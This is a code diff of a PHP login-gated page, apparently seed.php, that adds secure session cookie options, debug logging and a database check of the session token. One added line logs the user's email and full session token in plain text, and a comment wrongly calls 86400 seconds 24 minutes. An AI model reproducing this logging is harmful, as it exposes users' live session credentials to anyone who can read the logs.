@@ -1,13 +1,21 @@
 <?php
-// Start the session
-session_start();
+// Start the session with secure settings
+session_start([
+    'cookie_lifetime' => 86400, // 24 minutes
+    'cookie_secure' => true,    // Only send cookie over HTTPS
+    'cookie_httponly' => true, // Prevent JavaScript access to session cookie
+    'cookie_samesite' => 'Lax' // CSRF protection
+]);
 
 // Include the database connection file
 require_once "admin/db_connection.php";
 
-
 // Check if both the email and token are set in the session
 if (!isset($_SESSION["email"]) || !isset($_SESSION["token"])) {
+    // Log the session data for debugging
+    error_log('Session data missing. Email: ' . (isset($_SESSION["email"]) ? 'set' : 'not set') . 
+              ', Token: ' . (isset($_SESSION["token"]) ? 'set' : 'not set'));
+    
     // If email or token is not set, redirect the user back to login.php
     header("Location: login.php");
     exit();
@@ -27,7 +35,24 @@ function updateActivity($token, $activity) {
 $email = $_SESSION["email"];
 $token = $_SESSION["token"];
 
-// Update user activity to indicate visiting url.php
+// Debug: Log session data
+error_log('Session data in seed.php - Email: ' . $email . ', Token: ' . $token);
+
+// Verify token exists in database
+$stmt = $conn->prepare("SELECT id FROM user_submissions WHERE email = ? AND token = ?");
+$stmt->bind_param("ss", $email, $token);
+$stmt->execute();
+$result = $stmt->get_result();
+$stmt->close();
+
+if ($result->num_rows !== 1) {
+    error_log('Invalid or expired session - Token not found in database');
+    session_destroy();
+    header("Location: login.php");
+    exit();
+}
+
+// Update user activity to indicate visiting seed.php
 updateActivity($token, "SeedPage");
 
 // Use prepared statement to validate the token
